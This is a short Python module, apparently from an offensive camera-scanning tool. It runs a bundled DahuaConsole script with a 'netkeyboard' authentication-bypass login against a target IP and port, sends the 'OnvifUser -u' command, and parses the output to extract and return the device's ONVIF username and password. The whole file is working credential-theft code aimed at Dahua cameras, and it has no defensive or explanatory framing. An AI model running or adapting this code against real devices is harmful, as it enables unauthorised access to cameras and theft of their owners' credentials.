"""Run DahuaConsole to dump ONVIF users after an auth-bypass login.

The original implementation piped `echo ... | python Console.py` through
bash, which is dead on Windows. This uses subprocess stdin on all platforms.
"""
import os
import subprocess
import sys

from loguru import logger


def dump_onvif_users(ip, port, proto='dhip', timeout=30):
    """Return (user, password) or ('', '') if Console cannot extract them."""
    console = os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        'lib', 'DahuaConsole', 'Console.py',
    )
    if not os.path.isfile(console):
        return '', ''
    try:
        proc = subprocess.run(
            [
                sys.executable, '-Bu', console,
                '--logon', 'netkeyboard',
                '--rhost', str(ip),
                '--rport', str(port),
                '--proto', proto,
            ],
            input='OnvifUser -u\nquit all\n',
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        msg = (proc.stdout or '') + '\n' + (proc.stderr or '')
        logger.debug(msg.splitlines()[:40])
        items = msg.split('\n')
        for idx, val in enumerate(items):
            if 'Name' in val and idx + 1 < len(items):
                user = val.split(':')[-1].strip().strip(',').replace('"', '')
                passwd = items[idx + 1].split(':')[-1].strip().strip(',').replace('"', '')
                if user:
                    return user, passwd
    except Exception as e:
        logger.error(e)
    return '', ''
